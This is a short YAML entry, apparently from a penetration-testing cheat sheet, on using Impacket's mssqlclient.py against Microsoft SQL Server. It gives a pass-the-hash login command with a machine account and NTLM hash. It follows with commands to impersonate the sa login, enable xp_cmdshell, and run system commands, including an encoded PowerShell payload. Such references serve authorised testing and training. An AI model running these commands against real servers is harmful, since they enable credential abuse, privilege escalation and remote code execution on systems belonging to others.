---
description: |
  Impacket's mssqlclient.py allows for interacting with Microsoft SQL Servers using Windows authentication. This tool enables attackers to authenticate via NTLM hashes, enumerate privileges, and execute system commands on vulnerable SQL servers. The following command authenticates to an MSSQL server using a machine account and NTLM hash:

  Command Reference:
  ```
  --windows-auth: indicating Windows Authentication

  Windows machine account: WEB01$

  IP address: 10.10.21.14

  -no-pass / --hashes: because it is a pass the hash
  ```
command: |
  impacket-mssqlclient -windows-auth -no-pass 'WEB01$'@10.10.21.14 -hashes ":b978ea39b8d18a578cc6bfff77f1067"

code: |
  built-in commands:
  enum_impersonate
  exec_as_login sa
  enable_xp_cmdshell
  xp_cmdshell whoami
  xp_cmdshell powershell -e ENCODED_BASE64 

items:
  - Hash
  - Username
  - Password
services:
  - SQL
OS:
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
---